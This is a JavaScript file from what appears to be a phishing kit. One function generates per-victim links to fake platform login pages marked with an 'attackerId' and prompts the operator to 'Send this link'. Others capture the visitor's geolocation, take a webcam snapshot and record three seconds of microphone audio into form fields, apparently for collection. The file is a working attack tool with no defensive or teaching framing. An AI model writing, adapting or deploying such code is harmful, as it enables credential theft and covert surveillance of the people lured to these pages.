function generateLink() {
  const platform = document.getElementById("platform").value;
  const attackerId = Math.random().toString(36).substring(2, 15);
  const link = `${window.location.origin}/${platform}-login/${attackerId}`;
  document.getElementById("link-output").innerHTML =
    `Send this link: <a href="${link}">${link}</a>`;
}

function AccessgenerateLink() {
  const platform = document.getElementById("Access_Platform").value;
  const attackerId = Math.random().toString(36).substring(2, 15);
  const link = `${window.location.origin}/${platform}-testing/${attackerId}`;
  document.getElementById("link-output").innerHTML =
    `Send this link: <a href="${link}">${link}</a>`;
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        document.getElementById("latitude").value = position.coords.latitude;
        document.getElementById("longitude").value = position.coords.longitude;
      },
      (error) => {
        console.log("Location access denied");
      }
    );
  }
}

function getCameraAccess() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const snapshotInput = document.getElementById("snapshot");

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;
        setTimeout(() => {
          const context = canvas.getContext("2d");
          context.drawImage(video, 0, 0, 320, 240);
          const dataUrl = canvas.toDataURL("image/png");
          snapshotInput.value = dataUrl;

          stream.getTracks().forEach((track) => track.stop());
        }, 1000);
      })
      .catch((err) => {
        console.log("Camera access denied");
      });
  }
}

function getMicAccess() {
  const audioInput = document.getElementById("audio");

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices
      .getUserMedia({ audio: true })
      .then((stream) => {
        const mediaRecorder = new MediaRecorder(stream);
        const audioChunks = [];

        mediaRecorder.ondataavailable = (event) => {
          audioChunks.push(event.data);
        };

        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
          const reader = new FileReader();
          reader.readAsDataURL(audioBlob);
          reader.onloadend = () => {
            audioInput.value = reader.result;
          };
          stream.getTracks().forEach((track) => track.stop());
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 3000);
      })
      .catch((err) => {
        console.log("Microphone access denied");
      });
  }
}
